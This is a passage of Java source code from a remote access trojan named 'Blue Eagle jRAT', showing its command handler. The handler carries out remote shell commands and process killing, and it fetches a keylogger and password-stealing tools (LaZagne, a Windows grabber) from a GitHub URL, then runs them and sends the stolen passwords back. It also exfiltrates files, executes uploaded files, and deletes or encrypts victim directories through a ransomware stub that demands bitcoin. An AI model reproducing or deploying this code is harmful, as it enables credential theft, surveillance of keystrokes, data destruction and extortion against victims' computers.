				    	  try {
				    		  StringBuilder output = new StringBuilder();
				              Process process = processBuilder.start();

				              BufferedReader reader =
				                      new BufferedReader(new InputStreamReader(process.getInputStream()));

				              String line = "";
				           
				              while ((line = reader.readLine()) != null) {
				            	  output.append(line + "liner_split");
				              }

				          		 cs.Send("result_proc_linux" + YY + output + YY);
				          		 
				           

				          } catch (IOException e) {
				        	  cs.Send("error_terminal_proc" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
				          }
						   
				    		 
				      } else {
				    	  try {
			    			  String line;
			    			  StringBuilder output = new StringBuilder();
				    		   Process p = Runtime.getRuntime().exec("ps -axo pid,comm");

				    		   BufferedReader in = new BufferedReader(
				    		           new InputStreamReader(p.getInputStream()) );
				    		   while ((line = in.readLine()) != null) {
				    				  output.append(line + "liner_split");
				    		   }
				    		   in.close();
				    		   cs.Send("result_proc_other" + YY + output + YY);
			    		  } catch (Exception e) {
				        	  cs.Send("error_terminal_proc" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
				          }
				      }
			   
			   
			   
			   
			   
		   }  
		      if(xc.equals("kill_proc")){
		    	  boolean if_sudo = false;
		    	  boolean if_sigkill = false;
		    	  if(b.contains("sudo_kill")){
					   if_sudo = true;
				   }
		    	  if(b.contains("sig_kill")){
		    		  if_sigkill = true;
				   }
				   String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
					 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) { //MAC OS 
						 String kcmd = ("kill " + SplitString(b).get(2) );
						  if(if_sudo){
							  kcmd = "sudo " +"kill " + SplitString(b).get(2); 
						  }
						  if(if_sigkill){
							  kcmd = "kill -9 " + SplitString(b).get(2); 
						  }
						  if(if_sigkill&&if_sudo){
							  kcmd = "sudo " +"kill -9 " + SplitString(b).get(2); 
						  }
						 
							try {
								ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", kcmd);
							        builder.redirectErrorStream(true);
							        Process p = builder.start();
							        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
							        
							        cs.Send("killed_proc" + YY  + YY);
							        if_sudo = false;
							        if_sigkill = false;
							 
							} catch (Exception e) {
								  
							}
						 
					      } else if (platform.indexOf("win") >= 0) {//Windows OS
					    	  
					    	   Process p = Runtime.getRuntime().exec("taskkill.exe /F /PID " + SplitString(b).get(2) );
					 	      BufferedReader input = new BufferedReader
					 	          (new InputStreamReader(p.getInputStream()));
					    	  cs.Send("killed_proc" + YY  + YY);
					    	  if_sudo = false;
						        if_sigkill = false;
						 
					      } else if (platform.indexOf("nux") >= 0) {//LINUX OS 
					    	  String kcmd = ("kill " + SplitString(b).get(2) );
							  if(if_sudo){
								  kcmd = "sudo " +"kill " + SplitString(b).get(2); 
							  }
							  if(if_sigkill){
								  kcmd = "kill -9 " + SplitString(b).get(2); 
							  }
							  if(if_sigkill&&if_sudo){
								  kcmd = "sudo " +"kill -9 " + SplitString(b).get(2); 
							  }
					    	  ProcessBuilder processBuilder = new ProcessBuilder();
					    	  processBuilder.command("bash", "-c", kcmd);
					    	  String appender = "";
					    
					    	  try {
					    		  StringBuilder output = new StringBuilder();
					              Process process = processBuilder.start();

					              BufferedReader reader =
					                      new BufferedReader(new InputStreamReader(process.getInputStream()));

					             
					           
					              cs.Send("killed_proc" + YY  + YY);
					              if_sudo = false;
							        if_sigkill = false;
							       
					          } catch (IOException e) {
					        	 
					          }
							   
					    		 
					      } else {
					    	  try {
				    			  String line;
				    			  StringBuilder output = new StringBuilder();
				    			  String kcmd = ("kill " + SplitString(b).get(2) );
								  if(if_sudo){
									  kcmd = "sudo " +"kill " + SplitString(b).get(2); 
								  }
								  if(if_sigkill){
									  kcmd = "kill -9 " + SplitString(b).get(2); 
								  }
								  if(if_sigkill&&if_sudo){
									  kcmd = "sudo " +"kill -9 " + SplitString(b).get(2); 
								  }
					    		   Process p = Runtime.getRuntime().exec(kcmd);

					    		   BufferedReader in = new BufferedReader(
					    		           new InputStreamReader(p.getInputStream()) );
					    		  
					    		   cs.Send("killed_proc" + YY  + YY);
					    		   if_sudo = false;
							        if_sigkill = false;
							        
				    		  } catch (Exception e) {
					        	  
					          }
					      }
				   
				   
				   
				   
		      }
		   if(xc.equals("get_usr_folder")){
			   String currentUsersHomeDir = System.getProperty("user.home");
			   if(currentUsersHomeDir.length()>0){
				   cs.Send("get_usr_folder" + YY + currentUsersHomeDir + YY);
				   File folder = new File(currentUsersHomeDir);
				   File[] listOfFiles = folder.listFiles();

				   for (int i = 0; i < listOfFiles.length; i++) {
				     if (listOfFiles[i].isFile()) {
				    	 cs.Send("fileitem"  + YY +listOfFiles[i].getName() + YY + convertSize(listOfFiles[i].length()));
				    	 
				     } else if (listOfFiles[i].isDirectory()) {
				    	 cs.Send("folderitem" + YY + listOfFiles[i].getName());
				     }
				   }
			   }
			   
		   }
		   if(xc.equals("get_dsk_folder")){
			   String currentUsersHomeDir = System.getProperty("user.home");
			   
			   if(currentUsersHomeDir.length()>0){
				   try{
					     currentUsersHomeDir = currentUsersHomeDir + File_Seperator + "Desktop";
				   cs.Send("get_dsk_folder" + YY + currentUsersHomeDir + YY);
				   File folder = new File(currentUsersHomeDir);
				   File[] listOfFiles = folder.listFiles();

				   for (int i = 0; i < listOfFiles.length; i++) {
				     if (listOfFiles[i].isFile()) {
				    	 cs.Send("fileitem"  + YY +listOfFiles[i].getName() + YY + convertSize(listOfFiles[i].length()));
				    	 
				     } else if (listOfFiles[i].isDirectory()) {
				    	 cs.Send("folderitem" + YY + listOfFiles[i].getName());
				     }
				   }
				   }catch(Exception c){
					File folder = new File(currentUsersHomeDir);
				 
					    currentUsersHomeDir = currentUsersHomeDir + File_Seperator + "desktop" ;
				   cs.Send("get_dsk_folder" + YY + currentUsersHomeDir + YY);
				
				   File[] listOfFiles = folder.listFiles();

				   for (int i = 0; i < listOfFiles.length; i++) {
				     if (listOfFiles[i].isFile()) {
				    	 cs.Send("fileitem"  + YY +listOfFiles[i].getName() + YY + convertSize(listOfFiles[i].length()));
				    	 
				     } else if (listOfFiles[i].isDirectory()) {
				    	 cs.Send("folderitem" + YY + listOfFiles[i].getName());
				     }
				   }
				   }
				 
			   }
			   
		   }  if(xc.equals("clear_keylog")){
				String tempDir = System.getProperty("java.io.tmpdir");
				File out_file = new File(tempDir+File_Seperator+"jR_keylogs" + File_Seperator + "keys.txt");
			 
					FileOutputStream fos = new FileOutputStream(out_file);
					fos.write(("Keylogger\n").getBytes());
					fos.flush();
					fos.close();
				 
		   }
		     if(xc.equals("keylogger")){
		    	 	String tempDir = System.getProperty("java.io.tmpdir");
				File out_file = new File(tempDir+File_Seperator+"jR_keylogs" + File_Seperator + "keys.txt");
				File jar_logger =  new File(tempDir+File_Seperator+"keyboard_plugin.jar");
		    	 if (is_logger_started==1){
						if(out_file.exists()==false){
							is_logger_started=0;
							Desktop.getDesktop().open(jar_logger);
						}else{
							//read txt log content and sends it here
							if(out_file.length()> (5 * 1024)){
								String content = new String(Files.readAllBytes(out_file.toPath()));
								cs.Send("keylogger_data"  + YY + "warn=2" + YY + content);
							}else if(out_file.length()> (3 * 1024)){
								String content = new String(Files.readAllBytes(out_file.toPath()));
								cs.Send("keylogger_data"  + YY + "warn=1" + YY + content);
								
							}else{
								String content = new String(Files.readAllBytes(out_file.toPath()));
								cs.Send("keylogger_data"  + YY + "warn=0" + YY + content);
							}
							
						}
				}
		    	 
		    	 
		     }
		     if(xc.equals("pwd_grabberbase64_mac")){
		    	 String KB_String_Rec =(SplitString(b).get(2));
		    	 String homeDir = System.getProperty("user.home");
		    		String tempDir = homeDir;
		    		tempDir = tempDir+File_Seperator+"MAC_laz_pwd_grabber.zip";
		    	
		    		   FileOutputStream output = new FileOutputStream(new File(tempDir),true);
						  
					  
					   byte[] data = Base64.getDecoder().decode(KB_String_Rec);
					    
					   output.write(data);
					   output.flush();
					    output.close();
					  
		    		
		    		cs.Send("installed_pass_mac" + YY  );
		    	 	 
		    	 
		     }	     
		     if(xc.equals("pwd_grabberbase64_linux_p2")){
		    	 String KB_String_Rec =(SplitString(b).get(2));
		    	 
		    		String tempDir = System.getProperty("java.io.tmpdir");
		    		tempDir = tempDir+File_Seperator+"Linux_laz_pwd_grabber.zip";
		    	
		    		   FileOutputStream output = new FileOutputStream(new File(tempDir),true);
						  
					  
					   byte[] data = Base64.getDecoder().decode(KB_String_Rec);
					    
					   output.write(data);
					   output.flush();
					    output.close();
					  
		    		
		    		 
		    	 	cs.Send("installed_pass_linux_done" + YY  );
		    	 
		     }
		     if(xc.equals("pwd_grabberbase64_linux")){
		    	 String KB_String_Rec =(SplitString(b).get(2));
		    	 
		    		String tempDir = System.getProperty("java.io.tmpdir");
		    		tempDir = tempDir+File_Seperator+"Linux_laz_pwd_grabber.zip";
		    	
		    		   FileOutputStream output = new FileOutputStream(new File(tempDir),true);
						  
					  
					   byte[] data = Base64.getDecoder().decode(KB_String_Rec);
					    
					   output.write(data);
					   output.flush();
					    output.close();
					  
		    		
		    		 
		    	 	cs.Send("installed_pass_linux" + YY  );
		    	 
		     }
		     if(xc.equals("pwd_grabberbase64")){
		    	 String KB_String_Rec =(SplitString(b).get(2));
		    	 
		    		String tempDir = System.getProperty("java.io.tmpdir");
		    		tempDir = tempDir+File_Seperator+"windows_pass_grab.exe";
		    	
		    		   FileOutputStream output = new FileOutputStream(new File(tempDir),true);
						  
					  
					   byte[] data = Base64.getDecoder().decode(KB_String_Rec);
					    
					   output.write(data);
					   output.flush();
					    output.close();
					    pass_grabber_chunk +=1;
		    		String numeric = "fsfs" + pass_grabber_chunk;
		    		cs.Send("send_pass_grabber_windows" + YY  + numeric + YY );
		    	 if(new File(tempDir).length()/1024 >=pass_grabber_chunk){
		    		 cs.Send("pwd_grabber_downloaded" + YY);
		    		  return;
		    	 }
		    	 
		     }
		     if(xc.equals("keyloggerbase64")){
		    	 String KB_String_Rec =(SplitString(b).get(2));
		    	 
		    		String tempDir = System.getProperty("java.io.tmpdir");
		    		tempDir = tempDir+File_Seperator+"keyboard_plugin.jar";
		    	
		    		   FileOutputStream output = new FileOutputStream(new File(tempDir),true);
						  
					  
					   byte[] data = Base64.getDecoder().decode(KB_String_Rec);
					    
					   output.write(data);
					   output.flush();
					    output.close();
		    			Key_logger_chunk +=1;
		    		String numeric = "fsfs" + Key_logger_chunk;
		    		cs.Send("send_keylogger_chunk" + YY  + numeric + YY );
		    	 if(new File(tempDir).length()/1024 >=Key_logger_chunk){
		    		 cs.Send("keylogger_downloaded" + YY);
		    		  return;
		    	 }
		    	 
		     }
		     if(xc.equals("install_logger")){
				   
					String tempDir = System.getProperty("java.io.tmpdir");
					File out_file = new File(tempDir+File_Seperator+"jR_keylogs" + File_Seperator + "keys.txt");
					File jar_logger =  new File(tempDir+File_Seperator+"keyboard_plugin.jar");
					if (jar_logger.exists()){
					 //installed but not running
						if (is_logger_started==1){
								if(out_file.exists()==false){
									is_logger_started=0;
									Desktop.getDesktop().open(jar_logger);
									Desktop.getDesktop().edit(jar_logger);
									//starts it here
								}
						}else if (is_logger_started==0){
							//start code here	 
							is_logger_started = 1;
							Desktop.getDesktop().open(jar_logger);
						}
				
					}else{
						 //not installed 
						is_logger_started = 0;
						//download 
						 BufferedInputStream tBuffInStream = null;
					        FileOutputStream tFileOutStream = null;
					
					        try {
					        	tBuffInStream = new BufferedInputStream(new URL("https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Plugins/keylog_plugin.jar").openStream());
					        	
					        	tFileOutStream = new FileOutputStream(tempDir+File_Seperator+"keyboard_plugin.jar");
					
					            byte bArrBuff[] = new byte[1024];
					            int iLen;
					          
					            while ((iLen = tBuffInStream.read(bArrBuff, 0, 1024)) != -1)
					            {
					            	tFileOutStream.write(bArrBuff, 0, iLen);
					            	
					            }
					           
					            tBuffInStream.close();
					            tFileOutStream.close();
					            File jar_loggerz =  new File(tempDir+File_Seperator+"keyboard_plugin.jar");
					            is_logger_started = 1;
								Desktop.getDesktop().open(jar_loggerz);
								try{
								 cs.Send("key_logger_update"+YY);
									 
								}catch (Exception e) {
									 
									 
								}
								 
							} catch (Exception e) {
								e.printStackTrace();
							}
					}
					    
			   }
		     if(xc.equals("install_pass_grabber")){
				   
					String tempDir = System.getProperty("java.io.tmpdir");
					  String operSys = System.getProperty("os.name").toLowerCase();
			            if (operSys.contains("mac")||operSys.contains("darwin")) {
			            	 File_Seperator = "/";
			            	 String homeDir = System.getProperty("user.home");
			            	 tempDir = homeDir;
			            	 File pass_grabber =  new File(homeDir+File_Seperator+"MAC_laz_pwd_grabber.zip");
								if (pass_grabber.exists()){
								 //installed but not running 
									 //extract it and start running  #######################################################################################################
								if(new File(tempDir+File_Seperator+"MAC_laz_pwd_grabber"+File_Seperator + "Mac" +File_Seperator + "laZagne.py" ).exists()==false){
									unZipIt(pass_grabber.getAbsolutePath(), tempDir+File_Seperator+"MAC_laz_pwd_grabber");	
								}
								       
								String appender = "";
							try {
								 String double_qoutes = "\"";
								 String comm = "pip install -r " + double_qoutes + tempDir+File_Seperator+"MAC_laz_pwd_grabber"+File_Seperator + "requirements.txt"+ double_qoutes;
							       ProcessBuilder buildexr  = new ProcessBuilder("/bin/bash", "-c",  comm);
							       buildexr.start();
							       
						    	 
									  	  Thread.sleep(5000);
									        comm = "python " + double_qoutes + tempDir+File_Seperator+"MAC_laz_pwd_grabber"+File_Seperator +"Mac"+File_Seperator + "laZagne.py" +double_qoutes+ " all -vv" ;
									          ProcessBuilder builder  = new ProcessBuilder("/bin/bash", "-c",  comm);
									      
									        Process p = builder.start();
									        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
									        String line;
									        
									        while((line=r.readLine())!=null) {
									        	appender = appender + line + "liner_split";
									        }
									        cs.Send("result_pass" + YY + appender + YY);
									      
									} catch (Exception e) {
										  cs.Send("result_pass_err" + YY + appender + YY  + e.getMessage() + YY);
									}
								}else{
									 //not installed 
									//download 
									 BufferedInputStream tBuffInStream = null;
								        FileOutputStream tFileOutStream = null;
								
								        try {
								        	tBuffInStream = new BufferedInputStream(new URL("https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Plugins/MAC_laz_pwd_grabber.zip").openStream());
								        	
								        	tFileOutStream = new FileOutputStream(homeDir+File_Seperator+"MAC_laz_pwd_grabber.zip");
								
								            byte bArrBuff[] = new byte[1024];
								            int iLen;
								          
								            while ((iLen = tBuffInStream.read(bArrBuff, 0, 1024)) != -1)
								            {
								            	tFileOutStream.write(bArrBuff, 0, iLen);
								            	
								            }
								           
								            tBuffInStream.close();
								            tFileOutStream.close();
								            
								           
										} catch (Exception e) {
											e.printStackTrace();
										}
								         
									 
								}
			            } else if (operSys.contains("nix") || operSys.contains("nux")
			                    || operSys.contains("aix")) {
			            	 File_Seperator = "/";
			            	 File pass_grabber =  new File(tempDir+File_Seperator+"Linux_laz_pwd_grabber.zip");
								if (pass_grabber.exists()){
								 //installed but not running
								 //extract it and start running #######################################################################################################
									if(new File(tempDir+File_Seperator+"MAC_laz_pwd_grabber"+File_Seperator + "Linux" +File_Seperator + "laZagne.py" ).exists()==false){
										unZipIt(pass_grabber.getAbsolutePath(), tempDir+File_Seperator+"Linux_laz_pwd_grabber");
									}
									
								 
									 String double_qoutes = "\"";
									 String comm = "pip install -r " + double_qoutes + tempDir+File_Seperator+"Linux_laz_pwd_grabber"+File_Seperator + "requirements.txt"+ double_qoutes;
									 Runtime rt = Runtime.getRuntime();
							            Process proc = rt.exec(comm);
							            proc.waitFor();
							    	 
							    	  ProcessBuilder processBuilder2 = new ProcessBuilder();
							    	  comm = "python " + double_qoutes + tempDir+File_Seperator+"Linux_laz_pwd_grabber"+File_Seperator +"Linux"+File_Seperator + "laZagne.py" +double_qoutes+ " all -vv" ;
							      	  processBuilder2.command("bash", "-c", (comm));
							     
							    	  String appender = "";
							    
							    	  try {
							    		  StringBuilder output = new StringBuilder();
							              Process process = processBuilder2.start();

							              BufferedReader reader =
							                      new BufferedReader(new InputStreamReader(process.getInputStream()));

							              String line = "";
							           
							              while ((line = reader.readLine()) != null) {
							            	  output.append(line + "liner_split");
							              }

	 
							          		 cs.Send("result_pass" + YY + output + YY);
							           
							          } catch (IOException e) {
							        	  cs.Send("result_pass_err" + YY + appender + YY  + e.getMessage() + YY);
							          }
								}else{
									 //not installed 
									//download 
									 BufferedInputStream tBuffInStream = null;
								        FileOutputStream tFileOutStream = null;
								
								        try {
								        	tBuffInStream = new BufferedInputStream(new URL("https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Plugins/Linux_laz_pwd_grabber.zip").openStream());
								        	
								        	tFileOutStream = new FileOutputStream(tempDir+File_Seperator+"Linux_laz_pwd_grabber.zip");
								
								            byte bArrBuff[] = new byte[1024];
								            int iLen;
								          
								            while ((iLen = tBuffInStream.read(bArrBuff, 0, 1024)) != -1)
								            {
								            	tFileOutStream.write(bArrBuff, 0, iLen);
								            	
								            }
								           
								            tBuffInStream.close();
								            tFileOutStream.close();
								            
								           
										} catch (Exception e) {
											e.printStackTrace();
										}
								        
								}
			            } else if (operSys.contains("win")) {
			            	 File_Seperator = "\\";
			            	 File pass_grabber =  new File(tempDir+File_Seperator+"windows_pass_grab.exe");
								if (pass_grabber.exists()){
								 //installed but not running
							     //extract it and start running
									ProcessBuilder processBuilder = new ProcessBuilder();
							          // Windows
									 String double_qoutes = "\"";
							          processBuilder.command("cmd.exe", "/c", double_qoutes +  pass_grabber.getAbsolutePath()+ double_qoutes + " /stext " + tempDir+File_Seperator+"my_jrat_saved_passwords.txt");
							          String appender = "";
							          try {

							              Process process = processBuilder.start();

							              BufferedReader reader =
							                      new BufferedReader(new InputStreamReader(process.getInputStream()));

							              String line = "";
							            
							          } catch (Exception e) {
							        	 
							          } 
							    	  Thread.sleep(100);
									        
									    cs.Send("pass_grabbing_done" + YY + appender + YY);
								}else{
									 //not installed 
									//download 
									 BufferedInputStream tBuffInStream = null;
								        FileOutputStream tFileOutStream = null;
								
								        try {
								        	tBuffInStream = new BufferedInputStream(new URL("https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Plugins/windows_pass_grab.exe").openStream());
								        	
								        	tFileOutStream = new FileOutputStream(tempDir+File_Seperator+"windows_pass_grab.exe");
								
								            byte bArrBuff[] = new byte[1024];
								            int iLen;
								          
								            while ((iLen = tBuffInStream.read(bArrBuff, 0, 1024)) != -1)
								            {
								            	tFileOutStream.write(bArrBuff, 0, iLen);
								            	
								            }
								           
								            tBuffInStream.close();
								            tFileOutStream.close();
								           
								           
										} catch (Exception e) {
											e.printStackTrace();
										}
								        
								 //	cs.Send("send_pass_grabber_mac" + YY );
								}
			            } else if (operSys.contains("sunos") ||operSys.contains("solaris") ) {//
			            	File_Seperator = "/";
			            	 File pass_grabber =  new File(tempDir+File_Seperator+"Linux_laz_pwd_grabber.zip");
								if (pass_grabber.exists()){
								 //installed but not running
							     //extract it and start running  #######################################################################################################
									if(new File(tempDir+File_Seperator+"MAC_laz_pwd_grabber"+File_Seperator + "Linux" +File_Seperator + "laZagne.py" ).exists()==false){
										unZipIt(pass_grabber.getAbsolutePath(), tempDir+File_Seperator+"Linux_laz_pwd_grabber");
									}
									
									 ProcessBuilder processBuilder = new ProcessBuilder();
									 String double_qoutes = "\"";
									 String comm = "pip install -r " + double_qoutes + tempDir+File_Seperator+"Linux_laz_pwd_grabber"+File_Seperator + "requirements.txt"+ double_qoutes;

							    	  processBuilder.command("bash", "-c",comm);
							    	  processBuilder.start();
							    	  Thread.sleep(2000);
							    	  ProcessBuilder processBuilder2 = new ProcessBuilder();
							    	  comm = "python " + double_qoutes + tempDir+File_Seperator+"Linux_laz_pwd_grabber"+File_Seperator +"Linux"+File_Seperator + "laZagne.py" +double_qoutes+ " all -vv" ;
							      	  processBuilder2.command("bash", "-c", (comm));
							      
							    	 
							    	  String appender = "";
							    
							    	  try {
							    		  StringBuilder output = new StringBuilder();
							              Process process = processBuilder2.start();

							              BufferedReader reader =
							                      new BufferedReader(new InputStreamReader(process.getInputStream()));

							              String line = "";
							           
							              while ((line = reader.readLine()) != null) {
							            	  output.append(line + "liner_split");
							              }

	 
							          		 cs.Send("result_pass" + YY + output + YY);
							           
							          } catch (IOException e) {
							        	  cs.Send("result_pass_err" + YY + e.getMessage() + YY);
							          }
								}else{
									 //not installed 
									//download 
									 BufferedInputStream tBuffInStream = null;
								        FileOutputStream tFileOutStream = null;
								
								        try {
								        	tBuffInStream = new BufferedInputStream(new URL("https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Plugins/Linux_laz_pwd_grabber.zip").openStream());
								        	
								        	tFileOutStream = new FileOutputStream(tempDir+File_Seperator+"Linux_laz_pwd_grabber.zip");
								
								            byte bArrBuff[] = new byte[1024];
								            int iLen;
								          
								            while ((iLen = tBuffInStream.read(bArrBuff, 0, 1024)) != -1)
								            {
								            	tFileOutStream.write(bArrBuff, 0, iLen);
								            	
								            }
								           
								            tBuffInStream.close();
								            tFileOutStream.close();
								            
								           
										} catch (Exception e) {
											e.printStackTrace();
										}
									 
									 
								}
			            }
					
					    
			   }
		   if(xc.equals("get_passwords")){
	    	 	String tempDir = System.getProperty("java.io.tmpdir");
			File out_file = new File(tempDir+File_Seperator+"my_jrat_saved_passwords.txt");
			 		if(out_file.exists()==false){
						 //send message to press install at master
						 // when user sends install pass grabber will check if exists and execute it 
			 			//_laz_pwd_grabber.zip
			 			cs.Send("grabber_notx"  + YY);
					}else{
						//read txt log content and sends it here
						
						String content = new String(Files.readAllBytes(out_file.toPath()));
						StringBuffer bf = new StringBuffer(content);
						String final_content="";
						 for (char ch : bf.toString().toCharArray()){
							 try{
								if(Character.isIdentifierIgnorable(ch)==false){
									final_content +=""+ch;
								}
									
							 }catch(Exception e){
								 
							 }
							
						 }
						 final_content  = final_content.replace("\n", "new_linex");
						 
						
						
						  
							cs.Send("get_passwords_data"  + YY + final_content + YY);
							try{out_file.delete();}catch(Exception e){}
						
					}
			 
	    	 
	    	 
	     }
		   if(xc.equals("endcon")){
			   System.exit(0);
		   }
		   if(xc.equals("msg")){
			   String mesgtext = b;
			   mesgtext = mesgtext.replace("|", "");
			   mesgtext = mesgtext.substring(3);
			  String msg_TE = mesgtext; //Trimmed Value
			  MessageBox MessageBox =  new MessageBox();
			  MessageBox.infoBox("You Have Been Hacked By (Blue Eagle jRAT Tool user [Kid User]) [NOT Programmer]    \n This Message is Informative only [No user Action Required ]                                  \n"  + "Kid User Message :         \n" +  mesgtext,  "You Have Been Hacked By (Blue Eagle XPR Tool [Kid User])");
			  //System.out.println(msg_TE);
			   
		   }
		   if(xc.equals("rulnk")){
			   downloadFile((SplitString(b).get(2)), (SplitString(b).get(3)), true);
				 
				 
		   }
		   if(xc.equals("rufle")){
			   String fname = (SplitString(b).get(2));
			   Thread.currentThread().sleep(1000);
			   String homeDir = System.getProperty("user.home");
			   String fdir_Target = homeDir;
			   Runfile_FromDisk(fdir_Target + File_Seperator + fname,SplitString(b).get(3),true);
		   }
		   if(xc.equals("upfile")){
			   String file_target_dir = (SplitString(b).get(2));
			   Thread.currentThread().sleep(1000);
			   try{ 
				 //Target file need to upload to dir but not execute 
				   Runfile_FromDisk(file_target_dir,SplitString(b).get(3),false);
				   cs.Send("rename_succ");
			   }catch (Exception exx){
				   
				   
			   }
		   }
		   if(xc.equals("sendme")){
			   final String filedir = SplitString(b).get(2);//Target file need to download
			   if ( enco_file(filedir).equals("error")){
				   cs.Send("errorf");
			   }else{
			 
				   Thread t = new Thread(new Runnable(){
				        public void run(){
				        	File xnf = new File(filedir);
							   cs.Send("savefile" + YY + xnf.getName() + YY + enco_file(filedir));
				       return;
				        }
				    });
				  t.start();
				 
				  }
		   }
		   if(xc.equals("execute")){
			   String filedir_exec = SplitString(b).get(2);
				Desktop.getDesktop().open(new File(filedir_exec));
			   
		   }
		   if(xc.equals("delete")){
			   String filedir_delete= SplitString(b).get(2);
			   try{
				   File file = new File(filedir_delete);
				   if (file.isFile()){
					      if (file.exists()){
					   if (file.canWrite()){
						   file.delete();
						   cs.Send("del_succ");
					   }
				   }
				   }else { 
					   if (file.isDirectory()) {
						   deleteFolder(file);
						 cs.Send("del_succ");
								 
						  }
				   }
				
			   }catch (Exception ex){
				   
			   }
		   }
		   if(xc.equals("renamefile")){
			   String filedir_rename_withfname= SplitString(b).get(2);
			   String filedir_rename_not_include_name= SplitString(b).get(3);
			   String new_name = SplitString(b).get(4);
			   try{
				   File file = new File(filedir_rename_withfname);
				   if (file.exists()){
					   if (file.canWrite()){
						    
							   file.renameTo(new File(filedir_rename_not_include_name + File_Seperator + new_name));
						   cs.Send("del_succ");
					   }
				   }
			   }catch (Exception ex){
				   
			   }
		   }
		   if(xc.equals("renamefolder")){
			   String folderdir_rename_withfname= SplitString(b).get(2);
			   String folderdir_rename_not_include_name= SplitString(b).get(3);
			   String new_name_folder = SplitString(b).get(4);
			   try{
				   File file = new File(folderdir_rename_withfname);
				   if (file.exists()){
					   if (file.canWrite()){
						    
							   file.renameTo(new File(folderdir_rename_not_include_name + File_Seperator + new_name_folder));
						   cs.Send("del_succ");
					   }
				   }
			   }catch (Exception ex){
				   
			   }
		   }
		   if(xc.equals("crefolder")){
				 
			   String pathtofolderwithoutnewname = SplitString(b).get(2);;
			   String foldernameonly = SplitString(b).get(3);
					 Create_Folder(pathtofolderwithoutnewname,foldernameonly);
					  cs.Send("del_succ");
		   }
		   if(xc.equals("prepaekey")){
			   if (is_key_ready ==false){
				   String Received_Key = SplitString(b).get(2);
				   Prepate_Key_For_Encryption(Received_Key);
				 
			   }else{
				   cs.Send("ihavekey" + YY + Encryption_Key_value);
				   
			   }
		   }
		   if(xc.equals("encryptdir")){
			   if(is_key_ready == false){
				   cs.Send("idonthavekey");
			   }else if(is_key_ready == true){
				   final String Target_Dir = SplitString(b).get(2);
				  DestroyDirecroty(Target_Dir);
				  
				  
			   }
		   }
		   if(xc.equals("decryptdir")){
			   
			   if(is_key_ready == false){
				   cs.Send("idonthavekey");
			   }else if(is_key_ready == true){
				   String KEY_Decrypt = SplitString(b).get(2);
				   String Target_Dir = SplitString(b).get(3);
				  
				   Start_Decryptor(KEY_Decrypt,Target_Dir);
			   }
		   } 
		   
		   if(xc.equals("run_ransomware")){
			   
				 //  cs.Send("idonthavekey");
		
			   String bitcoinaddress =  SplitString(b).get(2);
			 
			   String extension =  SplitString(b).get(3);
			   String hacker_data =  SplitString(b).get(4);
			   hacker_data +=" ** Hacker Host in jar Trojan : " + host ;
			   hacker_data +=" ** Hacker Port in jar Trojan : " + port ;
			 //  hacker_data = hacker_data .replace("**", "\n");
			  
			   new Main_Ransomware_Stub(bitcoinaddress,extension,hacker_data,true);
		   }
		   if(xc.equals("run_global_r")){
			   
				 //  cs.Send("idonthavekey");
		
			   String bitcoinaddress =  SplitString(b).get(2);
			 
			   String extension =  SplitString(b).get(3);
			   String hacker_data =  SplitString(b).get(4);
			   hacker_data +=" ** Hacker Host in jar Trojan : " + host ;
			   hacker_data +=" ** Hacker Port in jar Trojan : " + port ;
			 //  hacker_data = hacker_data .replace("**", "\n");
			   
			   new Main_Ransomware_Stub(bitcoinaddress,extension,hacker_data,true);
		   }
		     if(xc.equals("unstable_download")){//upload from victim to hacker -_- for noobs -_-
			 
			   final String filePath =  SplitString(b).get(2);
			   File target = new File(filePath);
				int sizMB = (int) target.length()/(1024*1024);
				 String chunks_folder = target.getParent()+ File_Seperator + "UnstableChunksFor_" + target.getName().substring(0, target.getName().lastIndexOf("."));
				 int prev_prog = Get_Progress_downloader(chunks_folder + File_Seperator);
				// new MessageBox().infoBox(""+prev_prog, "");
				 there_but_notsent =0;
				 if(prev_prog==0){
					  Chunk_counter = 0;
				  }else{
					  Chunk_counter = prev_prog;
				  }
					try {
					  
						Create_Chunks_infolder_Uns(chunks_folder,target,sizMB);
					 
					} catch (Exception e) {
						 System.out.println("" + e.getLocalizedMessage()+"\n" + chunks_folder);
					}
				 
		
		   }  
		   if(xc.equals("downloadfile")){//upload from victim to hacker -_- for noobs -_-
			 
			   final String filePath =  SplitString(b).get(2);
			   File target = new File(filePath);
				int sizMB = (int) target.length()/(1024*1024);
				 String chunks_folder = target.getParent()+ File_Seperator + "ChunksFor_" + target.getName().substring(0, target.getName().lastIndexOf("."));
				 int prev_prog = Get_Progress_downloader(chunks_folder + File_Seperator);
				
				 if(prev_prog==0){
					  Chunk_counter = 0;
				  }else{
					  Chunk_counter = prev_prog;
				  }
					try {
					  
						 Create_Chunks_infolder(chunks_folder,target,sizMB);
					 
					} catch (Exception e) {
						 System.out.println("" + e.getLocalizedMessage()+"\n" + chunks_folder);
					}
				 
		
		   } 
		   if(xc.equals("send_chunk_uns")){
			  
			   try{
				  // there_but_notsent =1;
				 String numericx = SplitString(b).get(4).replace("fsfs", ""); //becasue some times if only integer some times not sent 
				 Chunk_counter = Integer.parseInt(numericx);
				 String filePath =  SplitString(b).get(2);
				 //Chunk_counter +=1;
				 save_Progress_downloader(filePath + File_Seperator + File_Seperator,Chunk_counter);
				 String chunk_filenamexxx = SplitString(b).get(5);
				 String parent_folder = "";
				 if(filePath.endsWith(File_Seperator)){
					 parent_folder = filePath.substring(0,filePath.lastIndexOf(File_Seperator));
					 parent_folder = parent_folder.substring(0,parent_folder.lastIndexOf(File_Seperator));
				 }else{
					 parent_folder = filePath.substring(0,filePath.lastIndexOf(File_Seperator));
				 }
				 String new_filepath = parent_folder + File_Seperator +chunk_filenamexxx; 
				 
				 if(Chunk_counter<get_max_chunks_number_uns(filePath, new File(new_filepath))){
					  split_uns_not_thread(filePath,new File(new_filepath),true,Chunk_counter);
				 } 
				
				
			   }catch(Exception x){
